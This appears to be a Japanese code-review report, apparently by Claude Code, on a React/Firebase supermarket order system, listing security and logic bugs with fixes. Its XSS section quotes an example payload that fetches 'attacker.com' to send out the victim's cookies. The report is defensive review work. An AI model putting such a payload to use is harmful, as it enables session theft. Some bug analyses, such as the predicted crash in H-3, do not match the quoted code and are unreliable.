# kajitsudo-order-system コードレビュー報告書

**実施日**: 2026-04-15  
**対象**: kajitsudo-order-system v1.0  
**レビュア**: Claude Code  

---

## 目次

1. [要件概要](#要件概要)
2. [CRITICAL 問題](#critical-問題本番前に必須修正)
3. [HIGH 問題](#high-問題早急に対応推奨)
4. [MEDIUM 問題](#medium-問題本番後でも対応すべき)
5. [LOW 問題](#low-問題改善推奨)
6. [未実装機能](#未実装機能)
7. [修正優先度ロードマップ](#修正優先度ロードマップ)

---

## 要件概要

- **システム名**: 発注管理システム（kajitsudo-order-system）
- **ユーザー**: スーパーマーケットバイヤー（顧客）、受注管理担当者（管理者）
- **機能**: 発注、変更、不良報告
- **Tech Stack**: React 18 + MUI v5 + Firebase (Auth, Firestore, Cloud Functions)

---

## CRITICAL 問題（本番前に必須修正）

### C-1: ハードコードされた管理者メールアドレス（セキュリティ脅威）

**概要**: `admin@example.com` および `sakura@example.com` がハードコードされており、これらのアドレスで登録するだけで管理者権限を獲得できます。

**場所**:
- `firestore.rules:19` — Firestore ルール内での管理者判定
- `src/contexts/AuthContext.js:37-41` — クライアント側での管理者判定

**Firestore ルール内**:
```javascript
function isAdmin() {
  return isAuthenticated() && (
    request.auth.token.admin == true ||
    request.auth.token.email == 'admin@example.com'  // ← 危険
  );
}
```

**AuthContext.js 内**:
```javascript
const adminEmails = [
  'admin@example.com',
  'sakura@example.com'  // テスト用（実装コメント）
];
const isAdmin = idTokenResult.claims.admin === true || adminEmails.includes(firebaseUser.email);
```

**影響**:
- 誰でも `admin@example.com` または `sakura@example.com` で新規登録すれば、全データ（顧客、商品、注文）にアクセス可能
- 管理画面へのアクセス、マスターデータの削除・編集が可能

**修正方法**:
1. Firestore ルールから email チェックを削除（Custom Claims に完全に依存）
2. `AuthContext.js` のメールホワイトリストを削除
3. 管理者権限設定は Firebase Admin SDK の `setCustomUserClaims()` でのみ行う

**優先度**: 🔴 **CRITICAL**

---

### C-2: Cloud Function の認証チェック欠落

**概要**: `updateNotificationStatus` 関数が完全に無防備で、認証されていない外部ユーザーが任意の通知レコードを書き換えられます。

**場所**: `functions/index.js:137-155`

```javascript
exports.updateNotificationStatus = functions.https.onCall(async (data, context) => {
  const { notificationId, status } = data;
  // ← context.auth チェックがない！
  await admin.firestore().collection('notifications').doc(notificationId).update({
    status: status,
    updatedAt: admin.firestore.FieldValue.serverTimestamp()
  });
});
```

**影響**:
- インターネット上の誰でも関数を呼び出し可能
- 任意の `notificationId` と `status` を指定して通知レコードを上書き
- 送信済み通知を「未送信」に変更したり、失敗通知を「送信済み」に詐称可能

**修正方法**:
```javascript
exports.updateNotificationStatus = functions.https.onCall(async (data, context) => {
  if (!context.auth) {
    throw new functions.https.HttpsError('unauthenticated', 'User must be authenticated');
  }
  if (!context.auth.token.admin) {
    throw new functions.https.HttpsError('permission-denied', 'Admin access required');
  }
  // ... rest of function
});
```

**優先度**: 🔴 **CRITICAL**

---

### C-3: Firestore ルールと実装コードの不一致（注文保存失敗）

**概要**: 最も深刻なバグ。Firestore セキュリティルールと実装コードでステータス値が異なるため、**全ての注文作成が静かに失敗します**（ユーザーに通知なく）。

**場所**:
- Firestore ルール: `firestore.rules:128`
- 実装: `src/firebase/services.js:108`

**Firestore ルール**:
```javascript
match /orders/{orderId} {
  allow create: if isAuthenticated() &&
    incomingData().customerId == getCustomerId() &&
    incomingData().status == 'pending' &&  // ← 'pending' を要求
    incomingData().createdAt == request.time;
}
```

**実装コード** (`services.js:108`):
```javascript
await addDoc(collection(db, 'orders'), {
  ...orderData,
  status: 'processing',  // ← 'processing' をセット ❌
  createdAt: serverTimestamp(),
  updatedAt: serverTimestamp()
});
```

**影響**:
- 顧客が発注ボタンをクリック → Firestore が `status` 値の不一致で拒否
- Firebase SDK は権限エラーを無言で返す（UI に何も表示されない）
- 顧客は「注文できた」と思うが、実際には保存されていない
- 注文データが Firestore に全く記録されない

**修正方法**:
`services.js:108` の `status: 'processing'` を `status: 'pending'` に変更

```javascript
status: 'pending',
```

**優先度**: 🔴 **CRITICAL** （機能が完全に動作しない）

---

### C-4: async 関数内での動的 `require()` 使用

**概要**: CommonJS の `require()` を async 関数内で動的に呼び出しており、バンドラー（webpack / Create React App）が正しく処理できない可能性があります。

**場所**:
- `src/components/OrderPage.js:245-246, 269-271`
- `src/components/DefectReportPage.js:195-196, 201-203`

**例** (`OrderPage.js:245-246`):
```javascript
const confirmOrder = async () => {
  try {
    const { auth } = require('../firebase/config');  // ← async内での動的require
    const { collection, addDoc, serverTimestamp } = require('firebase/firestore');  // ← 同様
    const { db } = require('../firebase/config');
    // ...
  }
};
```

**影響**:
- Create React App のバンドラーが tree-shake に失敗する可能性
- 本番ビルド時に firebase モジュールが正しくバンドルされない可能性
- 実行時に `require is not defined` エラーが発生する可能性
- ESM（ECMAScript Modules）環境では `require()` は使用すべきではない

**修正方法**:
ファイルの先頭に移動：

```javascript
import { auth } from '../firebase/config';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../firebase/config';

const confirmOrder = async () => {
  try {
    // ... 関数の処理、以上のimport変数を使用
  }
};
```

**優先度**: 🔴 **CRITICAL**

---

### C-5: Firestore 書き込み前のバリデーション不足

**概要**: 複数の注文を作成するループで、バリデーションと書き込みが混在しており、途中でエラーが発生しても既に作成された注文は残ります（部分的な注文汚染）。

**場所**: `src/components/OrderPage.js:183-204`

```javascript
const normalItems = Object.entries(cart).map(([productId, quantity]) => {
  const product = products.find(p => p.id === productId);
  const deliveryDate = deliveryDates[productId];
  
  if (isUnavailableDate(deliveryDate)) {
    throw new Error(`...`);  // ← .map() 内でthrow
  }
  // ...
});
```

その後の書き込みループ（`251行目`）:
```javascript
const promises = normalItems.map(async (item) => {
  return createOrder({  // ← Firestore 書き込み開始
    ...
  });
});
```

**シナリオ**:
1. 商品A、B、C を発注
2. A と B は正常に作成される
3. C でバリデーションエラーが発生
4. 例外がキャッチされるが、A と B は既に Firestore に保存されている

**影響**:
- 注文が部分的に保存される（データ汚染）
- ユーザーが「発注に失敗した」と思っても、商品によっては実は作成されている
- トランザクション的な「全て成功 or 全て失敗」が保証されない

**修正方法**:

```javascript
// Step 1: 先に全アイテムをバリデーション
const normalItems = Object.entries(cart).map(([productId, quantity]) => {
  // ... validations ...
  return { productId, quantity, deliveryDate };
});

// Step 2: 全てのバリデーション完了後に書き込み
const promises = normalItems.map(async (item) => {
  return createOrder({ ... });
});
```

**優先度**: 🔴 **CRITICAL** （データ整合性）

---

### C-6: 週次注文の日付が UTC 変換でズレる

**概要**: `toISOString()` がUTC時刻に変換するため、JST（+9）環境では納品日が1日前にシフトします。

**場所**: `src/components/OrderPage.js:226`

```javascript
const startDate = getNextWeekStart(product.weeklyStartDay);
const weekDays = generateWeekDays(startDate);
// ...
deliveryDate: deliveryDate.toISOString().split('T')[0],  // ← UTC 変換でズレ
```

**例**:
- ユーザーが JST で 2026-04-16（木）を選択
- `new Date(2026, 3, 16)` → ローカル時刻で2026-04-16
- `toISOString()` → UTC 時刻 2026-04-15T15:00:00Z（-9時間）
- `.split('T')[0]` → `'2026-04-15'` ❌（1日ズレた）

**影響**:
- 週次注文の納品日が実際より1日前の日付で登録される
- 配送スケジュールがズレる

**修正方法**:

```javascript
// ローカル日付のまま保存
const year = deliveryDate.getFullYear();
const month = String(deliveryDate.getMonth() + 1).padStart(2, '0');
const day = String(deliveryDate.getDate()).padStart(2, '0');
deliveryDate: `${year}-${month}-${day}`,
```

または通常注文と同じ方法を使用（`OrderPage.js:143-147` 参照）

**優先度**: 🔴 **CRITICAL** （データ不正確）

---

## HIGH 問題（早急に対応推奨）

### H-1: 注文履歴の編集状態がコンポーネント間で共有（データ破壊バグ）

**概要**: 注文の数量編集ダイアログの状態が親コンポーネント（`OrderHistory`）に集約されており、複数注文の編集が同時にできません。編集中の注文Aのダイアログを閉じずに別の注文Bを編集しようとすると、注文Bの保存ボタンで注文Aのデータが保存されてしまいます。

**場所**: `src/components/OrderHistory.js:46, 101-151`

```javascript
const [editingOrder, setEditingOrder] = useState(null);
const [editedItems, setEditedItems] = useState({});

// ... 後のコード ...

{orders.map((order) => (
  <OrderRow key={order.id}>
    {editingOrder?.id === order.id && (
      <Dialog>
        <Button onClick={handleSaveChanges}>変更を保存</Button>  // ← editingOrder を参照
      </Dialog>
    )}
  </OrderRow>
))}
```

**シナリオ**:
1. 注文A（id=1）で「数量変更」をクリック → `editingOrder = { id: 1, ... }`
2. 数量を 10 → 20 に変更
3. ダイアログを閉じずに、別の注文B（id=2）で「数量変更」をクリック → `editingOrder = { id: 2, ... }`
4. 注文Bの数量を 5 → 15 に変更
5. 「変更を保存」をクリック
6. **注文Aのデータ（id=1, 数量20）が注文Bとして保存される** ❌

**影響**:
- 直接的な注文データ破壊
- ユーザーの意図しない変更がデータベースに記録

**正しい実装例**:
`AdminOrderHistory.js:82-142` では状態を `OrderRow` サブコンポーネント内に移動しており、このパターンを `OrderHistory` でも採用すべき。

**修正方法**:
`OrderHistory` の編集状態を削除し、`OrderRow` サブコンポーネントを作成して状態を移動。

**優先度**: 🔴 **HIGH** （データ破壊）

---

### H-2: 週次注文が確認ダイアログに表示されない

**概要**: 通常注文と週次注文を同時に発注する際、確認ダイアログに通常注文だけが表示され、週次注文は非表示のまま確定されます。

**場所**: `src/components/OrderPage.js:752-762`

```javascript
{Object.entries(cart).map(([productId, quantity]) => {
  // ← 通常注文（cart）だけをmapしている
  return (
    <TableRow key={productId}>
      <TableCell>{/* 商品情報 */}</TableCell>
    </TableRow>
  );
})}

{/* weeklyCart の表示なし ❌ */}
```

**影響**:
- 顧客が確認画面で全ての発注内容を見られない
- 週次注文の発注を知らないまま確定してしまう可能性

**修正方法**:

```javascript
{Object.entries(cart).map(([productId, quantity]) => {
  // ... 通常注文の表示
})}

{/* 週次注文セクションを追加 */}
{Object.entries(weeklyCart).length > 0 && (
  <>
    <TableRow>
      <TableCell colSpan={3} variant="head">週次注文</TableCell>
    </TableRow>
    {Object.entries(weeklyCart).map(([key, data]) => {
      // ... 週次注文の表示
    })}
  </>
)}
```

**優先度**: 🔴 **HIGH** （顧客体験）

---

### H-3: products 未ロード時の race condition

**概要**: `OrderHistory` で `canEditOrder()` 関数が、`products` がまだロード中の状態で呼ばれ、`undefined` 参照エラーが発生します。

**場所**: `src/components/OrderHistory.js:44-46, 196`

```javascript
const { products } = useProducts(user.customerId, user.deliveryLocationId);

// ... 後のコード ...

{orders.map((order) => (
  <OrderRow
    key={order.id}
    onEdit={canEditOrder(order) ? () => setEditingOrder(order) : null}  // ← products がまだ[]
  >
```

**canEditOrder 実装** (`117-122行`):
```javascript
const canEditOrder = (order) => {
  const maxLeadTime = Math.max(...order.items.map(item => {
    const product = products.find(p => p.id === item.productId);
    return product ? product.minDeliveryDays : 0;  // ← product が undefined の場合
  }), 0);
  // ...
};
```

**シナリオ**:
1. `OrderHistory` がレンダリング開始
2. `useProducts()` がロード開始（非同期）
3. `products` はまだ `[]` 空配列
4. 最初のレンダリングで `canEditOrder()` が呼ばれる
5. `product.minDeliveryDays` で `Cannot read property 'minDeliveryDays' of undefined` エラー

**影響**:
- 初回レンダリング時にコンソールエラーが表示される
- 場合によっては UI が破壊される可能性

**修正方法**:

```javascript
const canEditOrder = (order) => {
  if (!products || products.length === 0) return false;  // ガード句追加
  
  const maxLeadTime = Math.max(...order.items.map(item => {
    const product = products.find(p => p.id === item.productId);
    return product ? product.minDeliveryDays : 0;
  }), 0);
  // ...
};
```

**優先度**: 🔴 **HIGH** （実行時エラー）

---

### H-4: 数量 0 のアイテムが保存できてしまう

**概要**: 注文編集時に数量を 0 にまで減らせ、その状態で「変更を保存」ができてしまい、¥0 の明細が Firestore に保存されます。

**場所**: `src/components/OrderHistory.js:133`, `src/components/AdminOrderHistory.js:95`

```javascript
const handleQuantityChange = (productId, delta) => {
  setEditedItems(prev => ({
    ...prev,
    [productId]: Math.max(0, (prev[productId] || 0) + delta)  // ← 0 で止まる
  }));
};
```

**影響**:
- 数量 0 の行が Firestore に保存される
- 注文の金額計算が複雑になる
- CSV エクスポート時に ¥0 明細が表示される

**修正方法**:
1. 数量が 0 になったアイテムは自動的に `editedItems` から削除
2. または保存時に 0 数量のアイテムをフィルタリング

```javascript
const handleQuantityChange = (productId, delta) => {
  setEditedItems(prev => {
    const newQty = Math.max(0, (prev[productId] || 0) + delta);
    if (newQty === 0) {
      const updated = { ...prev };
      delete updated[productId];
      return updated;
    }
    return {
      ...prev,
      [productId]: newQty
    };
  });
};
```

**優先度**: 🔴 **HIGH** （データ品質）

---

### H-5: 不良報告が Firestore から読み込まれない

**概要**: 不良報告を新規作成時に Firestore に保存しているにもかかわらず、過去の報告一覧は常に `localStorage` から読み込まれています。別デバイスやブラウザキャッシュをクリアしたら、過去の報告が全て消えます。

**場所**: `src/components/DefectReportPage.js:50-69, 132-134`

```javascript
useEffect(() => {
  setPastReports(loadReports(user.customerId));  // ← localStorage から読込
}, [user.customerId]);

// ... 新規報告作成時 ...
if (isFirebaseAvailable) {
  await addDoc(collection(db, 'defectReports'), {  // ← Firestore に保存
    ...reportData
  });
}
```

**影響**:
- Firestore に保存されたデータが表示されない
- ユーザーが報告の履歴を参照できない
- 別デバイスからアクセスすると報告が見えない

**修正方法**:
Firebase が利用可能な場合は Firestore から、そうでない場合は `localStorage` から読込

```javascript
useEffect(() => {
  const loadPastReports = async () => {
    if (isFirebaseAvailable) {
      const q = query(
        collection(db, 'defectReports'),
        where('customerId', '==', user.customerId),
        orderBy('createdAt', 'desc')
      );
      const snapshot = await getDocs(q);
      setPastReports(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
    } else {
      setPastReports(loadReports(user.customerId));
    }
  };
  loadPastReports();
}, [user.customerId]);
```

**優先度**: 🔴 **HIGH** （機能不完全）

---

### H-6: 管理者全顧客画面での N+1 Firestore リスナー

**概要**: 管理者の全顧客注文一覧画面で、顧客数分の `useOrders` フックが同時に起動し、大量の Firestore リスナーが作成されます。

**場所**: `src/components/AdminOrderHistory.js:296`

```javascript
const AdminOrderHistory = ({ allCustomers }) => {
  return (
    {allCustomers.map(customer => (
      <CustomerOrderSection key={customer.id} customer={customer} />
    ))}
  );
};

const CustomerOrderSection = ({ customer }) => {
  const { orders, loading, error, updateOrderItems } = useOrders(customer.id);  // ← N回起動
  // ...
};
```

**影響**:
- 顧客が 20 社ある場合、20 個の Firestore リスナーが同時オープン
- 読み取りコストが線形に増加
- UI 更新が遅くなる、メモリ使用量が増加

**修正方法**:
1. 単一の `useOrders` で全顧客の注文を一括取得
2. または、コンポーネント内で仮想化（virtualization）を導入

**優先度**: 🔴 **HIGH** （スケーラビリティ）

---

## MEDIUM 問題（本番後でも対応すべき）

### M-1: メール本文に HTML エスケープなし（XSS リスク）

**概要**: 注文通知メールの HTML テンプレート内で、顧客が入力した値（商品名、原産地、顧客名など）が直接埋め込まれており、HTML/JavaScript がエスケープされていません。

**場所**: `functions/index.js:75-134`

```javascript
async function generateEmailTemplate(orderData) {
  return `
    <table>
      <tr>
        <td>${item.workCode}</td>
        <td>${item.productName}</td>  <!-- ← エスケープなし -->
        <td>${item.origin}</td>        <!-- ← エスケープなし -->
      </tr>
    </table>
  `;
}
```

**リスク例**:
- 商品名を `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">` に設定
- メール内で JavaScript が実行される可能性は低いが、`<img>` タグは読み込まれる
- CSS based data exfiltration

**影響**:
- 環境によってはメール内で active content が実行される
- ユーザーの個人情報が漏洩する可能性

**修正方法**:

```javascript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

async function generateEmailTemplate(orderData) {
  return `
    <table>
      <tr>
        <td>${escapeHtml(item.workCode)}</td>
        <td>${escapeHtml(item.productName)}</td>
        <td>${escapeHtml(item.origin)}</td>
      </tr>
    </table>
  `;
}
```

**優先度**: 🟡 **MEDIUM** （XSS リスク）

---

### M-2: バッチ更新に件数上限・スキーマ検証なし

**概要**: CSV で大量のマスターデータをインポートする `batchUpdateMasterData` 関数が、件数上限もフィールド検証もなく、任意の値を書き込めます。

**場所**: `functions/index.js:158-211`

```javascript
exports.batchUpdateMasterData = functions.https.onCall(async (data, context) => {
  const { dataType, records, options } = data;
  
  for (const record of records) {  // ← 上限なし
    await admin.firestore().collection(dataType).doc(record.id).set(
      { ...record },  // ← フィールド検証なし
      { merge: true }
    );
  }
});
```

**リスク例**:
- 悪意のある管理者が `records: [{...}, {...}, ... 100万件 ...]` を送信
- 関数がメモリ不足で失敗、または Firestore の write quota を超過
- 予期しないフィールドが保存される

**影響**:
- Cloud Function の費用が増加
- データベースの不整合

**修正方法**:

```javascript
const ALLOWED_FIELDS = {
  customers: ['id', 'name', 'email', 'salesStaffId', 'minDeliveryDays', 'isActive'],
  products: ['id', 'workCode', 'name', 'specification', 'origin', 'unitPrice', 'minDeliveryDays', 'isActive']
};

const MAX_BATCH_SIZE = 1000;

exports.batchUpdateMasterData = functions.https.onCall(async (data, context) => {
  const { dataType, records } = data;
  
  if (!context.auth?.token.admin) {
    throw new functions.https.HttpsError('permission-denied', 'Admin only');
  }
  
  if (records.length > MAX_BATCH_SIZE) {
    throw new functions.https.HttpsError('invalid-argument', `Max ${MAX_BATCH_SIZE} records`);
  }
  
  for (const record of records) {
    const filteredRecord = {};
    for (const field of ALLOWED_FIELDS[dataType]) {
      if (field in record) {
        filteredRecord[field] = record[field];
      }
    }
    await admin.firestore().collection(dataType).doc(record.id).set(filteredRecord, { merge: true });
  }
});
```

**優先度**: 🟡 **MEDIUM** （リソース管理）

---

### M-3: syncCustomerClaims が管理者権限を上書き

**概要**: 顧客マスターの `syncCustomerClaims` 関数を実行すると、全ユーザーの `admin: false` にリセットされるため、管理者アカウントの権限が剥奪される可能性があります。

**場所**: `functions/index.js:450-455`

```javascript
async function syncCustomerClaims(customerId, dataRecord) {
  // ...
  for (const userRecord of userRecords) {
    await admin.auth().setCustomUserClaims(userRecord.uid, {
      admin: false,  // ← 無条件に false にセット
      customerId: customerId
    });
  }
}
```

**シナリオ**:
1. 管理者ユーザーのメールアドレスが誤って `customers` コレクションに登録されている
2. `syncCustomerClaims` を実行
3. その管理者ユーザーの `admin: true` が `admin: false` に上書きされる
4. 管理者が管理画面にアクセス不可に

**影響**:
- 管理者権限が剥奪される
- 管理機能が使用不可になる

**修正方法**:

```javascript
async function syncCustomerClaims(customerId, dataRecord) {
  // ...
  for (const userRecord of userRecords) {
    const currentClaims = userRecord.customClaims || {};
    // 既存の admin 権限を保持
    await admin.auth().setCustomUserClaims(userRecord.uid, {
      admin: currentClaims.admin || false,  // 既存値を尊重
      customerId: customerId
    });
  }
}
```

**優先度**: 🟡 **MEDIUM** （権限管理）

---

### M-4: Native prompt() / alert() の使用

**概要**: Material-UI で統一されたデザインの中で、ネイティブブラウザの `prompt()` と `alert()` が使用されており、UX が一貫していません。

**場所**:
- `OrderPage.js:661, 682` — `prompt()` で数量入力
- `OrderPage.js:316`, `OrderHistory.js:151`, `AdminOrderHistory.js:112` — `alert()` でエラー表示

```javascript
const qty = prompt('全ての日に設定する数量を入力してください：');

alert('発注に失敗しました。もう一度お試しください。');
```

**影響**:
- デスクトップで見た目が悪い
- iOS では `prompt()` が抑制される場合がある
- モバイル UX が悪い
- スクリーンリーダーでの説明が不適切

**修正方法**:
MUI の `Dialog` / `Alert` コンポーネントで置き換え

```javascript
// 数量入力ダイアログ
<Dialog open={showQtyDialog} onClose={() => setShowQtyDialog(false)}>
  <DialogTitle>数量入力</DialogTitle>
  <DialogContent>
    <TextField
      autoFocus
      value={inputQty}
      onChange={(e) => setInputQty(e.target.value)}
      type="number"
    />
  </DialogContent>
  <DialogActions>
    <Button onClick={() => setShowQtyDialog(false)}>キャンセル</Button>
    <Button onClick={applyQty} variant="contained">適用</Button>
  </DialogActions>
</Dialog>
```

**優先度**: 🟡 **MEDIUM** （UX）

---

### M-5: 注文履歴・管理者画面にページネーションなし

**概要**: 注文一覧が全件表示され、ページネーションやフィルタリング機能がありません。

**場所**: `src/components/OrderHistory.js`, `src/components/AdminOrderHistory.js`

**影響**:
- 注文が数十件を超えると、画面スクロールが非常に遅くなる
- UI レンダリングに時間がかかる
- 特定の注文を探すのに時間がかかる

**修正方法**:
Firestore クエリに `limit()` と `offset` を追加、UI に MUI `Pagination` を実装

```javascript
const ITEMS_PER_PAGE = 20;

const fetchOrders = async (page) => {
  const offset = (page - 1) * ITEMS_PER_PAGE;
  const q = query(
    collection(db, 'orders'),
    where('customerId', '==', customerId),
    orderBy('createdAt', 'desc'),
    limit(ITEMS_PER_PAGE + 1),
    startAfter(lastDoc)  // offset 代わり
  );
  // ...
};
```

**優先度**: 🟡 **MEDIUM** （パフォーマンス）

---

### M-6: その他の N+1 リスナー問題

同様に、以下の場所でも改善が必要：

- `AdminOrderHistory.js:240` — 顧客ごとに `useOrders` 起動（重複）

**優先度**: 🟡 **MEDIUM**

---

## LOW 問題（改善推奨）

### L-1: ステータス関連ヘルパーの重複

`OrderHistory.js` と `AdminOrderHistory.js` に同じヘルパー関数が重複実装されています。

**重複関数**:
- `getStatusColor()` — ステータスに応じた色
- `getStatusText()` — ステータスの日本語ラベル
- `getStatusIcon()` — ステータスのアイコン
- `getOrderDeliveryDate()` — 納品日フォーマット

**修正方法**: `src/utils/orderHelpers.js` に抽出

```javascript
// src/utils/orderHelpers.js
export const getStatusColor = (status) => {
  const colors = {
    pending: 'warning',
    change_pending: 'info',
    confirmed: 'success',
    // ...
  };
  return colors[status] || 'default';
};
```

---

### L-2: 成功アラートが自動で消えない

`OrderPage.js:351` で表示される成功メッセージが、ユーザーが手動でクローズするまで表示されたままです。

```javascript
{success && (
  <Alert severity="success" sx={{ mb: 2 }} onClose={() => setSuccess('')}>
    {success}
  </Alert>
)}
```

**修正方法**: `useEffect` で自動非表示化

```javascript
useEffect(() => {
  if (success) {
    const timer = setTimeout(() => setSuccess(''), 5000);
    return () => clearTimeout(timer);
  }
}, [success]);
```

---

### L-3: console.log が本番コードに残存

デバッグ用の `console.log` がプロダクションコードに残っており、ブラウザ DevTools を開くと内部情報が表示されます。

**場所**: `OrderPage.js:293, 312`, `AuthContext.js:73, 124, 195`

**修正方法**: 削除、または環境に応じた logger に置き換え

---

### L-4: アクセシビリティ不足

#### アイコンのみボタンに aria-label なし
`App.js:170-278` の mobile nav ボタンがアイコンのみで、スクリーンリーダーが読み上げられません。

```javascript
<IconButton
  onClick={() => setCurrentPage('order')}
  aria-label="発注"  // ← 追加
>
  <ShoppingCartIcon />
</IconButton>
```

#### フォーム入力フィールドのラベル不足
`OrderPage.js` の数量入力フィールドに accessible label がありません。

```javascript
<TextField
  aria-label={`${product.name} の数量`}
  // ...
/>
```

---

### L-5: LINE 通知が未実装

`functions/index.js:68-71` で LINE 通知関数がスタブのままで、`lineUserId` が Cloud Functions ログに露出しています。

```javascript
async function sendLineNotification(salesStaff, orderData, orderId) {
  // LINE Bot APIを使用した通知実装予定
  console.log('LINE通知実装予定:', salesStaff.lineUserId);  // ← ログ露出
}
```

**修正方法**: LINE Messaging API と連携、または完全に削除

---

### L-6: 納品先変更ボタンのアイコンが誤り

`App.js:228` でバック矢印アイコンが使用されていますが、このアクションは「戻る」ではなく「配送先を切り替える」なので、別のアイコン（位置情報、交換など）が適切です。

```javascript
<ArrowBackIcon sx={{ display: { xs: 'block', sm: 'none' } }} />
// ↓ に変更
<LocationOnIcon />
// または
<SwapHorizIcon />
```

---

## 未実装機能

### LINE 通知

- **現状**: スタブのみ実装（`console.log`）
- **必要**: LINE Messaging API 実装、`lineUserId` の安全な管理

### 不良報告の Firestore 永続化

- **現状**: 新規報告は Firestore に保存、過去報告は localStorage のみ
- **必要**: `defectReports` コレクション設計、Firestore からの読み込み実装

### notifications キューの処理

- **現状**: `notifications` コレクションに書き込むが、処理 Consumer がない
- **必要**: Cloud Function で処理、またはオンデマンド送信機能

---

## 修正優先度ロードマップ

### Phase 1: 本番前（今すぐ） ✅ 完了 (2026-04-15)
- **C-1** ハードコード admin メール削除
- **C-2** updateNotificationStatus に認証追加
- **C-3** orders status を 'pending' に修正
- **C-4** require() を import に変更
- **C-5** バリデーション→書き込み順序修正
- **C-6** UTC 日付をローカル保存に修正

**推定工数**: 2-4 営業日

### Phase 2: リリース前（1-2週間内） ✅ 完了 (2026-04-15)
- **H-1** OrderHistory 編集状態を subcomponent に移動
- **H-2** weeklyCart を確認ダイアログに表示
- **H-3** products ロード完了をガード
- **H-4** 0 数量アイテムの削除
- **H-5** defectReports の Firestore 読み込み実装
- **H-6** AdminOrderHistory の N+1 リスナー最適化

**推定工数**: 3-5 営業日

### Phase 3: 初期リリース後（1ヶ月以内） ✅ 完了 (2026-04-15)
- **M-1** メール XSS対策（HTML エスケープ）
- **M-2** バッチ更新の件数・フィールド検証
- **M-3** syncCustomerClaims の権限保持
- **M-4** prompt/alert → MUI Dialog に置き換え
- **M-5** ページネーション実装
- **M-6** その他の N+1 最適化（H-6 で解消済み）

**推定工数**: 3-4 営業日

### Phase 4: 安定稼働後 ✅ 完了 (2026-04-15)
- **L-1** ステータスヘルパーを `src/utils/orderHelpers.js` に集約
- **L-2** 成功アラートを5秒後に自動消去
- **L-3** デバッグ用 `console.log` を削除
- **L-4** アイコンのみボタンに `aria-label` を追加
- **L-5** LINE通知スタブの `console.log` を削除
- **L-6** 納品先変更ボタンのアイコンを `ArrowBackIcon` → `SwapHorizIcon` に変更

**推定工数**: 2-3 営業日

---

## セキュリティチェックリスト

- [x] `admin@example.com`, `sakura@example.com` を削除（C-1 対応済み）
- [x] 全 Cloud Functions に認証チェック（C-2 対応済み）
- [x] メール HTML エスケープ（M-1 対応済み）
- [x] Firestore ルールの权限検証（C-1 対応済み）
- [x] 本番環境での hardcoded テスト credentials 削除（C-1 対応済み）
- [ ] HTTPS のみで通信（Firebase Hosting デプロイ時に自動適用）
- [ ] CORS ヘッダーの確認（Cloud Functions デプロイ時に確認）
- [ ] Cloud Function のタイムアウト設定確認（デプロイ時に確認）

---

## テストチェックリスト

- [ ] 全ステータス遷移のテスト
- [ ] 複数商品の一括発注テスト
- [ ] 注文編集の複数同時実行テスト
- [ ] 週次注文の日付検証（JST）
- [ ] Firebase未使用時（demo mode）のテスト
- [ ] 管理画面の大量データ処理テスト
- [ ] モバイル (iOS, Android) での操作テスト

---

## 参考資料

- `CLAUDE.md` — プロジェクト実装ガイド
- `SECURITY_RULES.md` — セキュリティルール詳細
- `firestore.indexes.json` — Firestore インデックス定義
- `firebase.json` — Firebase プロジェクト設定

---

**レビュー完了日**: 2026-04-15  
**レビュア**: Claude Code (claude-haiku-4-5-20251001)

---

## 実施済み修正サマリー（2026-04-15）

レビュー指摘の全24項目（C×6・H×6・M×6・L×6）をすべて同日中に対応・ビルド確認済み。

| Phase | 対応件数 | 主な内容 |
|-------|---------|---------|
| Phase 1 (CRITICAL) | 6件 | 認証強化、静的import化、日付バグ修正 |
| Phase 2 (HIGH) | 6件 | サブコンポーネント分離、N+1解消、UX修正 |
| Phase 3 (MEDIUM) | 6件 | XSS対策、バッチ検証、MUI Dialog化、ページネーション |
| Phase 4 (LOW) | 6件 | 共通ヘルパー集約、aria-label、console.log整理 |

**最終ビルド**: exit code 0（既存警告のみ・新規エラーなし）
